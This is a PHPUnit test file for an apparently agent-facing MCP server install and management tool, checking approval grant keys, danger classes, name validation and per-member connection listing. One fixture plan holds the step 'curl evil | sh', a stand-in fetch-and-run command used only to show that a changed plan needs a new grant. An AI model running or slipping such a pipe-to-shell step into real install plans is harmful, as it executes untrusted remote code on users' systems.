<?php

declare(strict_types=1);

namespace OpenCCK\Test\Unit\App\Mcp;

use OpenCCK\App\Mcp\McpInstaller;
use OpenCCK\App\Mcp\McpInstallTool;
use OpenCCK\App\Mcp\McpSources;
use OpenCCK\Domain\Agent\DangerClass;
use OpenCCK\Test\Support\FakeSandbox;
use OpenCCK\Test\Support\InMemoryMcpInstallRepository;
use PHPUnit\Framework\TestCase;

/**
 * spec: brief/skills-mcp.md#установка-и-обновление — a source may be allowed for good; a plan and an approval are
 * asked each time, so a grant names exactly what it allows
 */
final class McpInstallToolTest extends TestCase {
    private function tool(): McpInstallTool {
        $sandbox = new FakeSandbox();
        return new McpInstallTool(new McpInstaller(
            new InMemoryMcpInstallRepository(),
            new McpSources($sandbox),
            $sandbox,
            static fn(): array => [],
            static fn(\OpenCCK\App\Mcp\McpEntry $e, string $c): \OpenCCK\App\Mcp\McpRendered => $e->render(static fn(): ?string => null),
            static fn(): string => '',
        ), $sandbox);
    }

    public function testAGrantNamesTheSourceOrTheExactPlan(): void {
        $tool = $this->tool();
        $plan = ['action' => 'install', 'name' => 'template', 'steps' => ['npm run check'], 'entry' => ['command' => 'node', 'args' => ['${INSTALL_DIR}/index.js']]];
        $other = ['steps' => ['curl evil | sh']] + $plan;

        self::assertSame('mcp-source:https://github.com/x/y', $tool->grantKey(['action' => 'fetch', 'name' => 'template', 'url' => 'https://github.com/x/y']));
        self::assertStringStartsWith('mcp-install:template ', $tool->grantKey($plan), 'never a grant of any call of the tool');
        self::assertNotSame($tool->grantKey($plan), $tool->grantKey($other), 'another plan is another grant');
        self::assertStringStartsWith('mcp-approve:template ', $tool->grantKey(['action' => 'approve', 'name' => 'template', 'classes' => 'hints']));
        self::assertSame(DangerClass::Irreversible, $tool->danger($plan));
    }

    /** spec: brief/skills-mcp.md#установка-и-обновление — a name the install cannot take is an error that says the rule */
    public function testANameTheInstallCannotTakeIsAnError(): void {
        $tool = $this->tool();
        $who = new \OpenCCK\Domain\Entity\Member(1, \OpenCCK\Domain\Entity\MemberKind::Human, \OpenCCK\Domain\Entity\Role::admin(), 'Я');
        $context = new \OpenCCK\App\Agent\Tool\ToolContext(1, 1, $who, new \Amp\NullCancellation());

        $refused = $tool->execute(['action' => 'fetch', 'name' => 'Mercurius.Template', 'url' => 'https://github.com/opencck/mercurius-mcp-template'], $context);

        self::assertTrue($refused->isError, 'a refusal read as data was repeated by the model');
        self::assertStringContainsString('24', $refused->content);
        self::assertStringContainsString('дефис', $refused->content, 'the rule told is the rule checked');
        $properties = $tool->definition()->parameters['properties'] ?? null;
        self::assertIsArray($properties);
        $schema = $properties['name'] ?? null;
        self::assertIsArray($schema);
        self::assertSame('^[a-z0-9][a-z0-9_-]{0,23}$', $schema['pattern'] ?? null);
    }

    public function testAGrantOfManagingNamesTheActionAndTheInstall(): void {
        $sandbox = new FakeSandbox();
        $manage = new \OpenCCK\App\Mcp\McpManageTool(new McpInstaller(new InMemoryMcpInstallRepository(), new McpSources($sandbox), $sandbox, static fn(): array => [], static fn(\OpenCCK\App\Mcp\McpEntry $e, string $c): \OpenCCK\App\Mcp\McpRendered => $e->render(static fn(): ?string => null), static fn(): string => ''));

        self::assertSame('mcp-update:template', $manage->grantKey(['action' => 'update', 'name' => 'template']));
        self::assertSame('mcp-remove:template', $manage->grantKey(['action' => 'remove', 'name' => 'template']));
        self::assertSame('mcp-allow:template project:5', $manage->grantKey(['action' => 'allow', 'name' => 'template', 'context' => 'project:5']));
    }

    /** spec: brief/skills-mcp.md#файл-mcpjson-и-одобрение-записи — the agent sees the state of the connections and why one fails */
    public function testTheListShowsTheConnectionsOfThisContextAndOfTheOwners(): void {
        $sandbox = new FakeSandbox();
        $manage = new \OpenCCK\App\Mcp\McpManageTool(new McpInstaller(new InMemoryMcpInstallRepository(), new McpSources($sandbox), $sandbox, static fn(): array => [], static fn(\OpenCCK\App\Mcp\McpEntry $e, string $c): \OpenCCK\App\Mcp\McpRendered => $e->render(static fn(): ?string => null), static fn(): string => ''));
        $servers = new \OpenCCK\Test\Support\InMemoryMcpServerRepository();
        $servers->add('owners', 'gemini-api', 'stdio:php gemini', null);
        $servers->update('owners', 'gemini-api', 'error', null, 'no secret GEMINI_API_KEY');
        $servers->add('member:1', 'mail', 'stdio:php mail', null);
        $servers->update('member:1', 'mail', 'connected', 'h');
        $servers->add('member:2', 'other', 'stdio:php other', null);
        $manage->useConnections($servers);
        $owner = new \OpenCCK\Domain\Entity\Member(1, \OpenCCK\Domain\Entity\MemberKind::Human, \OpenCCK\Domain\Entity\Role::admin(), 'Я');

        $listed = $manage->execute(['action' => 'list'], new \OpenCCK\App\Agent\Tool\ToolContext(1, 1, $owner, new \Amp\NullCancellation()))->content;

        self::assertStringContainsString('mail — connected', $listed);
        self::assertStringContainsString('gemini-api — error: no secret GEMINI_API_KEY', $listed);
        self::assertStringNotContainsString('other', $listed, 'another member\'s connections are not shown');
    }

    /** spec: brief/skills-mcp.md#файл-mcpjson-и-одобрение-записи — an entry not written is an error, not data to read past */
    public function testAnEntryNotWrittenIsAnError(): void {
        $sandbox = new FakeSandbox();
        $manage = new \OpenCCK\App\Mcp\McpManageTool(new McpInstaller(new InMemoryMcpInstallRepository(), new McpSources($sandbox), $sandbox, static fn(): array => [], static fn(\OpenCCK\App\Mcp\McpEntry $e, string $c): \OpenCCK\App\Mcp\McpRendered => $e->render(static fn(): ?string => null), static fn(): string => ''));
        $manage->useEntries(static fn(string $context, string $name): array => $name === 'ok' ? [true, 'written'] : [false, 'bad name']);
        $who = new \OpenCCK\Domain\Entity\Member(1, \OpenCCK\Domain\Entity\MemberKind::Human, \OpenCCK\Domain\Entity\Role::user(), 'Я');
        $context = new \OpenCCK\App\Agent\Tool\ToolContext(1, 1, $who, new \Amp\NullCancellation());
        $entry = ['command' => 'npx', 'args' => ['ssh-mcp']];

        $refused = $manage->execute(['action' => 'entry', 'name' => 'Base.npx', 'entry' => $entry], $context);
        $written = $manage->execute(['action' => 'entry', 'name' => 'ok', 'entry' => $entry], $context);

        self::assertSame([true, 'bad name'], [$refused->isError, $refused->content]);
        self::assertSame([false, 'written'], [$written->isError, $written->content]);

        // an entry of another context is not served in this chat: the answer says where it works
        $elsewhere = $manage->execute(['action' => 'entry', 'name' => 'ok', 'context' => 'project:3', 'entry' => $entry], $context);
        self::assertStringStartsWith('written', $elsewhere->content);
        self::assertStringContainsString('member:1', $elsewhere->content);
    }

    /** spec: brief/skills-mcp.md#файл-mcpjson-и-одобрение-записи — an entry is taken out of its file, not uninstalled */
    public function testAnEntryIsTakenOutOfTheFileOfItsContext(): void {
        $sandbox = new FakeSandbox();
        $manage = new \OpenCCK\App\Mcp\McpManageTool(new McpInstaller(new InMemoryMcpInstallRepository(), new McpSources($sandbox), $sandbox, static fn(): array => [], static fn(\OpenCCK\App\Mcp\McpEntry $e, string $c): \OpenCCK\App\Mcp\McpRendered => $e->render(static fn(): ?string => null), static fn(): string => ''));
        $asked = [];
        $manage->useEntryRemoval(static function (string $context, string $name) use (&$asked): array {
            $asked[] = "$context|$name";
            return $name === 'box' ? [true, 'removed'] : [false, 'no such entry'];
        });
        $who = new \OpenCCK\Domain\Entity\Member(1, \OpenCCK\Domain\Entity\MemberKind::Human, \OpenCCK\Domain\Entity\Role::user(), 'Я');
        $context = new \OpenCCK\App\Agent\Tool\ToolContext(1, 1, $who, new \Amp\NullCancellation());

        $removed = $manage->execute(['action' => 'remove_entry', 'name' => 'box', 'context' => 'mine'], $context);
        $missing = $manage->execute(['action' => 'remove_entry', 'name' => 'other'], $context);

        self::assertSame([false, 'removed'], [$removed->isError, $removed->content]);
        self::assertSame([true, 'no such entry'], [$missing->isError, $missing->content]);
        self::assertSame(['member:1|box', 'member:1|other'], $asked, 'mine and the chat context are the caller file');
        self::assertSame(DangerClass::Write, $manage->danger(['action' => 'remove_entry']));
        self::assertSame('mcp-remove_entry:box member:1', $manage->grantKey(['action' => 'remove_entry', 'name' => 'box', 'context' => 'member:1']));
    }
}
